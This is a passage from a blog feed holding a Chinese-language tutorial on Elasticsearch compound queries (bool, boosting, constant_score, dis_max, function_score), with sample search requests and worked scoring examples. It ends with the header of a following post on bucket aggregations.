        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>复合查询有</strong>：<code>bool query</code>(布尔查询)、<code>boosting query</code>(提高查询)、<code>constant_score</code>（固定分数查询）、<code>dis_max</code>(最佳匹配查询）、<code>function_score</code>(函数查询）。</p><h2 id="一、bool-query-布尔查询"><a href="#一、bool-query-布尔查询" class="headerlink" title="一、bool query(布尔查询)"></a>一、bool query(布尔查询)</h2><h4 id="1、概念"><a href="#1、概念" class="headerlink" title="1、概念"></a>1、概念</h4><p><code>定义</code> 可以理解成通过<code>布尔逻辑</code>将较小的查询组合成较大的查询。</p><p>Bool查询语法有以下特点</p><ol><li>子查询可以任意顺序出现</li><li>可以嵌套多个查询，包括bool查询</li><li>如果bool查询中没有must条件，should中必须至少满足一条才会返回结果。</li></ol><p>bool查询包含四种操作符，分别是<strong>must,should,must_not,filter</strong>。他们均是一种数组，数组里面是对应的判断条件。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">must</span>：    必须匹配。贡献算分</span><br><span class="line"><span class="selector-tag">must_not</span>：过滤子句，必须不能匹配，但不贡献算分 </span><br><span class="line"><span class="selector-tag">should</span>：  选择性匹配，至少满足一条。贡献算分</span><br><span class="line"><span class="selector-tag">filter</span>：  过滤子句，必须匹配，但不贡献算分</span><br></pre></td></tr></table></figure><h4 id="2、官方例子"><a href="#2、官方例子" class="headerlink" title="2、官方例子"></a>2、官方例子</h4><p>看下官方举例</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST _search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"bool"</span> : &#123;</span><br><span class="line">      <span class="attr">"must"</span> : &#123;</span><br><span class="line">        <span class="attr">"term"</span> : &#123; <span class="attr">"user"</span> : <span class="string">"kimchy"</span> &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"filter"</span>: &#123;</span><br><span class="line">        <span class="attr">"term"</span> : &#123; <span class="attr">"tag"</span> : <span class="string">"tech"</span> &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"must_not"</span> : &#123;</span><br><span class="line">        <span class="attr">"range"</span> : &#123;</span><br><span class="line">          <span class="attr">"age"</span> : &#123; <span class="attr">"gte"</span> : <span class="number">10</span>, <span class="attr">"lte"</span> : <span class="number">20</span> &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"should"</span> : [</span><br><span class="line">        &#123; <span class="attr">"term"</span> : &#123; <span class="attr">"tag"</span> : <span class="string">"wow"</span> &#125; &#125;,</span><br><span class="line">        &#123; <span class="attr">"term"</span> : &#123; <span class="attr">"tag"</span> : <span class="string">"elasticsearch"</span> &#125; &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"minimum_should_match"</span> : <span class="number">1</span>,</span><br><span class="line">      <span class="attr">"boost"</span> : <span class="number">1.0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在filter元素下指定的查询对评分没有影响 , 评分返回为0。分数仅受已指定查询的影响。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">官方例子</span><br><span class="line">GET _search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;bool&quot;: &#123;</span><br><span class="line">      &quot;filter&quot;: &#123;</span><br><span class="line">        &quot;term&quot;: &#123;</span><br><span class="line">          &quot;status&quot;: &quot;active&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子查询查询为所有文档分配0分，因为没有指定评分查询。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">官方例子</span><br><span class="line">GET _search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;bool&quot;: &#123;</span><br><span class="line">      &quot;must&quot;: &#123;</span><br><span class="line">        &quot;match_all&quot;: &#123;&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;filter&quot;: &#123;</span><br><span class="line">        &quot;term&quot;: &#123;</span><br><span class="line">          &quot;status&quot;: &quot;active&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此bool查询具有match_all查询，该查询为所有文档指定1.0分。</p><h4 id="3、Bool嵌套查询"><a href="#3、Bool嵌套查询" class="headerlink" title="3、Bool嵌套查询"></a>3、Bool嵌套查询</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 嵌套，实现了 should not 逻辑</span></span><br><span class="line">POST /products/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"query"</span>: &#123;</span><br><span class="line">    <span class="string">"bool"</span>: &#123;</span><br><span class="line">      <span class="string">"must"</span>: &#123;</span><br><span class="line">        <span class="string">"term"</span>: &#123;</span><br><span class="line">          <span class="string">"price"</span>: <span class="string">"30"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">"should"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"bool"</span>: &#123;</span><br><span class="line">            <span class="string">"must_not"</span>: &#123;</span><br><span class="line">              <span class="string">"term"</span>: &#123;</span><br><span class="line">                <span class="string">"avaliable"</span>: <span class="string">"false"</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="string">"minimum_should_match"</span>: 1</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二、boosting-query"><a href="#二、boosting-query" class="headerlink" title="二、boosting query"></a>二、boosting query</h2><h4 id="1、概念-1"><a href="#1、概念-1" class="headerlink" title="1、概念"></a>1、概念</h4><p>在上面的复合查询我们可以通过<code>must_not+must</code> 先剔除不想匹配的文档，再获取匹配的文档，但是有一种场景就是我并不需要完全剔除，而是把需要剔除的那部分文档的</p><p>分数降低。这个时候就可以使用boosting query。下面会举例说明。</p><h4 id="2、举例"><a href="#2、举例" class="headerlink" title="2、举例"></a>2、举例</h4><p><strong>1)、创建索引并添加数据</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建索引并添加数据</span></span><br><span class="line">POST /news/_bulk</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123; <span class="string">"_id"</span>: 1 &#125;&#125;</span><br><span class="line">&#123; <span class="string">"content"</span>:<span class="string">"Apple Mac"</span> &#125;</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123; <span class="string">"_id"</span>: 2 &#125;&#125;</span><br><span class="line">&#123; <span class="string">"content"</span>:<span class="string">"Apple iPad"</span> &#125;</span><br><span class="line">&#123; <span class="string">"index"</span>: &#123; <span class="string">"_id"</span>: 3 &#125;&#125;</span><br><span class="line">&#123; <span class="string">"content"</span>:<span class="string">"Apple employee like Apple Pie and Apple Juice"</span> &#125;</span><br></pre></td></tr></table></figure><p><strong>2)、 bool must复合查询</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询结果3-&gt;1-&gt;2</span></span><br><span class="line">POST news/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"query"</span>: &#123;</span><br><span class="line">    <span class="string">"bool"</span>: &#123;</span><br><span class="line">      <span class="string">"must"</span>: &#123;</span><br><span class="line">        <span class="string">"match"</span>:&#123;<span class="string">"content"</span>:<span class="string">"apple"</span>&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3)、bool must_not复合查询</strong></p><p>我们需要的是文档中需要包含 <strong>apple</strong>，但是文档中不包含 <strong>pie</strong>，那么我们可以这么做</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#must_not的方式，将3的记录强制排除掉 (结果 1-&gt;2)</span></span><br><span class="line">POST news/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"query"</span>: &#123;</span><br><span class="line">    <span class="string">"bool"</span>: &#123;</span><br><span class="line">      <span class="string">"must"</span>: &#123;</span><br><span class="line">        <span class="string">"match"</span>:&#123;<span class="string">"content"</span>:<span class="string">"apple"</span>&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">"must_not"</span>: &#123;</span><br><span class="line">        <span class="string">"match"</span>:&#123;<span class="string">"content"</span>:<span class="string">"pie"</span>&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3)、 boosting query</strong></p><p>上面第二种比较粗暴，可能我实际开发过程中，如果出现 <strong>pie</strong>，我并不想把这条记录完全过滤掉，而是希望降低他的分数，让它也出现在列表中，只是查询结果可能比较靠后。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过Boosting的方式，将3的记录也纳入结果集，只是排名会靠后。(结果 1-&gt;2-&gt;3)</span></span><br><span class="line">POST news/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"query"</span>: &#123;</span><br><span class="line">    <span class="string">"boosting"</span>: &#123;</span><br><span class="line">      <span class="string">"positive"</span>: &#123;</span><br><span class="line">        <span class="string">"match"</span>: &#123;</span><br><span class="line">          <span class="string">"content"</span>: <span class="string">"apple"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">"negative"</span>: &#123;</span><br><span class="line">        <span class="string">"match"</span>: &#123;</span><br><span class="line">          <span class="string">"content"</span>: <span class="string">"pie"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">"negative_boost"</span>: 0.5</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">说明`boosting需要搭配三个关键字 `positive` , `negative` , `negative_boost</span><br></pre></td></tr></table></figure><p>只有匹配了 <strong>positive查询</strong> 的文档才会被包含到结果集中，但是同时匹配了<strong>negative查询</strong> 的文档会被降低其相关度，通过将文档原本的<code>_score和negative_boost</code>参数进行</p><p>相乘来得到新的_score。因此，<code>negative_boost参数一般小于1.0</code>。在上面的例子中，任何包含了指定负面词条的文档的<code>_score</code>都会是其原本_score的一半。</p><h4 id="3、思考boosting-query应用场景"><a href="#3、思考boosting-query应用场景" class="headerlink" title="3、思考boosting query应用场景"></a>3、思考boosting query应用场景</h4><p><code>场景举例</code> 我们通过去索引中搜索 <strong>‘苹果公司’</strong> 相关的信息，然后我们在查询中的信息为 <strong>‘苹果’</strong>。</p><p><strong>1）那么我们查询的条件是：must = ‘苹果’。也就是文档中必须包含’苹果’</strong></p><p>但是我们需要的结果是苹果公司相关信息，如果你的文档是 <strong>‘苹果树’,’苹果水果’</strong>，那么其实此苹果非彼苹果如果匹配到其实没有任何意义。</p><p><strong>2）那么我们修改查询条件为： must = ‘苹果’ AND must_not = ‘树 or 水果’</strong></p><p>就是说就算文档包含了<strong>苹果</strong>，但因为包含了<strong>树或者水果</strong>那么我们也会过滤这条文档信息，因为我们要查的苹果公司相关信息，如果你是苹果树那对我来讲确实是不匹配，</p><p>所以直接过滤掉，看是没啥问题。</p><p>但是你想，这样做是不是太粗暴了，因为一个文档中包含’苹果’和’树’那不代表一定是苹果树，而可能是 <strong>‘苹果公司组织员工一起去种树’</strong> 那么这条文档理应出现</p><p>而不是直接过滤掉，所以我们就可以用<code>boosting query</code>。就像上面这个例子一样。</p><h2 id="三、constant-score-固定分数查询"><a href="#三、constant-score-固定分数查询" class="headerlink" title="三、constant_score(固定分数查询)"></a>三、constant_score(固定分数查询)</h2><p><code>定义</code> 常量分值查询，目的就是返回<code>指定的score</code>，一般都结合<code>filter</code>使用，因为filter context忽略score。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">举例</span><br><span class="line">（结果 1-&gt;2-&gt;3 同时分数都为2.5）</span><br><span class="line">POST news&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;constant_score&quot;: &#123;</span><br><span class="line">      &quot;filter&quot;: &#123;</span><br><span class="line">        &quot;match&quot;: &#123;</span><br><span class="line">         &quot;content&quot;:&quot;apple&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;boost&quot;: 2.5</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/img/es/es7-0.png" alt="es"> </p><p>可以看出分数都是2.5</p><h2 id="四、dis-max-最佳匹配查询）"><a href="#四、dis-max-最佳匹配查询）" class="headerlink" title="四、dis_max(最佳匹配查询）"></a>四、dis_max(最佳匹配查询）</h2><h4 id="1、概念-2"><a href="#1、概念-2" class="headerlink" title="1、概念"></a>1、概念</h4><p><code>dis_max</code> : 只是取分数最高的那个query的分数而已。</p><p>看下官方例子</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span>: &#123;</span><br><span class="line">        <span class="string">"dis_max"</span> : &#123;</span><br><span class="line">            <span class="string">"queries"</span> : [</span><br><span class="line">                &#123; <span class="string">"term"</span> : &#123; <span class="string">"title"</span> : <span class="string">"Quick pets"</span> &#125;&#125;,</span><br><span class="line">                &#123; <span class="string">"term"</span> : &#123; <span class="string">"body"</span> : <span class="string">"Quick pets"</span> &#125;&#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">"tie_breaker"</span> : 0.7</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">解释</span><br></pre></td></tr></table></figure><p>假设一条文档的’title’查询得分是 1，’body’查询得分是1.6。那么总得分为：1.6+1*0.7 = 2.3。</p><p>如果我们去掉<code>&quot;tie_breaker&quot; : 0.7</code> ，那么tie_breaker默认为0，那么这条文档的得分就是 1.6 + 1*0 = 1.6</p><h4 id="2、举例-1"><a href="#2、举例-1" class="headerlink" title="2、举例"></a>2、举例</h4><p><strong>1）创建数据</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1、创建索引</span></span><br><span class="line">PUT /dismax</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"settings"</span>: &#123;</span><br><span class="line">        <span class="string">"number_of_shards"</span>: 1,</span><br><span class="line">        <span class="string">"number_of_replicas"</span>: 1</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"mappings"</span>: &#123;</span><br><span class="line">            <span class="string">"properties"</span>: &#123;</span><br><span class="line">                <span class="string">"title"</span>: &#123;</span><br><span class="line">                    <span class="string">"type"</span>:<span class="string">"text"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"content"</span>: &#123;</span><br><span class="line">                    <span class="string">"type"</span>:<span class="string">"text"</span></span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#2、创建数据</span></span><br><span class="line">PUT  /dismax/_doc/1 </span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"title"</span> : <span class="string">"i like java"</span>,  </span><br><span class="line">  <span class="string">"content"</span> : <span class="string">"the weather is nice today"</span> </span><br><span class="line">&#125;</span><br><span class="line">PUT  /dismax/_doc/2</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"title"</span> : <span class="string">"It will rain tomorrow"</span>, </span><br><span class="line">  <span class="string">"content"</span> : <span class="string">"Development beginner"</span></span><br><span class="line">&#125;</span><br><span class="line">PUT  /dismax/_doc/3</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"title"</span> :<span class="string">"i like java is very much"</span>, </span><br><span class="line">  <span class="string">"content"</span> :<span class="string">"I am a development beginner"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2）、should查询</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#should查询查询 （结果 3-&gt;2-&gt;1</span></span><br><span class="line">GET /dismax/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span>: &#123;</span><br><span class="line">        <span class="string">"bool"</span>: &#123;</span><br><span class="line">            <span class="string">"should"</span>: [</span><br><span class="line">                &#123; <span class="string">"match"</span>: &#123; <span class="string">"title"</span>: <span class="string">"java beginner"</span> &#125;&#125;,</span><br><span class="line">                &#123; <span class="string">"match"</span>: &#123; <span class="string">"content"</span>:  <span class="string">"java beginner"</span> &#125;&#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/img/es/es7-1.png" alt="es"> </p><p>should计算分值：<strong>1)、运行<code>should</code>子句中的两个查询 2)、相加查询返回的分值</strong></p><p>doc1：title: 0.53 + content: 0 = 0.53</p><p>doc2：title：0 + content：0.59 = 0,59</p><p>doc3：title：0.41 + content：0.42 = 0.83</p><p>所有最终运行结果： <code>3 – 2 – 1</code></p><p><strong>2)dis_max查询（不带tie_breaker）</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#运行结果（2-1-3)</span></span><br><span class="line">GET /dismax/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span>: &#123;</span><br><span class="line">        <span class="string">"dis_max"</span>: &#123;</span><br><span class="line">            <span class="string">"queries"</span>: [</span><br><span class="line">                &#123; <span class="string">"match"</span>: &#123; <span class="string">"title"</span>: <span class="string">"java beginner"</span> &#125;&#125;,</span><br><span class="line">                &#123; <span class="string">"match"</span>: &#123; <span class="string">"content"</span>:  <span class="string">"java beginner"</span> &#125;&#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/img/es/es7-2.png" alt="es"> </p><p>我们可以很明显看出: <strong>只是取分数最高的那个query的分数排序。</strong></p><p>doc1：title: 0.53 ; content: 0 = 0.53</p><p>doc2：title：0 ; content：0.59 = 0,59</p><p>doc3：title：0.41 ; content：0.42 = 0.42</p><p>所以这里的排序为 <code>2 – 1 – 3</code></p><p><strong>3）dis_max查询（不带tie_breaker）</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#运行结果 3-2-1</span></span><br><span class="line">GET /dismax/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span>: &#123;</span><br><span class="line">        <span class="string">"dis_max"</span>: &#123;</span><br><span class="line">            <span class="string">"queries"</span>: [</span><br><span class="line">                &#123; <span class="string">"match"</span>: &#123; <span class="string">"title"</span>: <span class="string">"java beginner"</span> &#125;&#125;,</span><br><span class="line">                &#123; <span class="string">"match"</span>: &#123; <span class="string">"content"</span>:  <span class="string">"java beginner"</span> &#125;&#125;</span><br><span class="line">            ],</span><br><span class="line">             <span class="string">"tie_breaker"</span> : 0.5</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/es/es7-3.png" alt="es"> </p><p>这里可以看出看出: <strong>取分数最高的那个query的分数,同时其它子查询查询的分数乘以tie_breaker</strong></p><p>doc1：title: 0.53 + content: 0 = 0.53</p><p>doc2：title：0 + content：0.59 = 0,59</p><p>doc3：title：0.41 + content：0.42*0.5 = 0.62</p><p>所以这里的排序为 <code>3 – 2 – 1</code></p><h2 id="五、function-score-函数查询）"><a href="#五、function-score-函数查询）" class="headerlink" title="五、function_score(函数查询）"></a>五、function_score(函数查询）</h2><h4 id="1、概念-3"><a href="#1、概念-3" class="headerlink" title="1、概念"></a>1、概念</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">定义&#96; function_score是处理分值计算过程的终极工具。它让你能够对所有匹配了主查询的每份文档&#96;调用一个函数来调整甚至是完全替换原来的_score。</span><br></pre></td></tr></table></figure><p><code>注意</code> 要使用function_score，用户必须定义一个查询和一个或多个函数，这些函数计算查询返回的每个文档的新分数。</p><p>它拥有几种预先定义好了的函数：</p><p><code>weight</code> 对每份文档适用一个简单的提升，且该提升不会被归约：当weight为2时，结果为2 * _score。</p><p><code>field_value_factor</code> 使用文档中某个字段的值来改变_score，比如将受欢迎程度或者投票数量考虑在内。</p><p><code>random_score</code> 使用一致性随机分值计算来对每个用户采用不同的结果排序方式，对相同用户仍然使用相同的排序方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">衰减函数(Decay Function) - linear，exp，gauss</span><br></pre></td></tr></table></figure><p>将像publish_date，geo_location或者price这类浮动值考虑到_score中，偏好最近发布的文档，邻近于某个地理位置(译注：其中的某个字段)的文档或者价格</p><p>(译注：其中的某个字段)靠近某一点的文档。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script_score</span><br></pre></td></tr></table></figure><p>使用自定义的脚本来完全控制分值计算逻辑。如果你需要以上预定义函数之外的功能，可以根据需要通过脚本进行实现。</p><h4 id="2）使用场景"><a href="#2）使用场景" class="headerlink" title="2）使用场景"></a>2）使用场景</h4><p>有关function_score如果要深入讲，估计一篇博客都不够，所以这里说下在现实中可能会用的场景，如果你有这些场景，那么就可以考虑用function_score。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1）假设我们又一个资讯类<span class="selector-tag">APP</span>我们希望让人阅读量高的文章出现在结果列表的头部，但是主要的排序依据仍然是全文搜索分值。</span><br><span class="line"></span><br><span class="line">2）当用户搜索酒店，它的要求是 1、离他目前位置1<span class="selector-tag">Km</span>内 2、价格在500元内。如果我们只是使用一个 <span class="selector-tag">filter</span> 排除所有市中心方圆 1<span class="selector-tag">KM</span>以外的酒店，</span><br><span class="line">再用一个<span class="selector-tag">filter</span>排除每晚价格超过500元的酒店，这种作法太过强硬，可能有一间房在2<span class="selector-tag">K</span>米，但是超级便宜一晚只要100元，用户可能会因此愿意妥协住这间房。</span><br></pre></td></tr></table></figure><p>有关function_score例子这里就不写了，具体的可以参考官方文档：<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-function-score-query.html" target="_blank" rel="noopener">Function score query</a></p>]]></content>
      
      
      <categories>
          
          <category> Elasticsearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elasticsearch——Bucket聚合查询</title>
      <link href="/2023/11/10/Elasticsearch%E2%80%94%E2%80%94Bucket%E8%81%9A%E5%90%88%E6%9F%A5%E8%AF%A2/"/>
      <url>/2023/11/10/Elasticsearch%E2%80%94%E2%80%94Bucket%E8%81%9A%E5%90%88%E6%9F%A5%E8%AF%A2/</url>
      
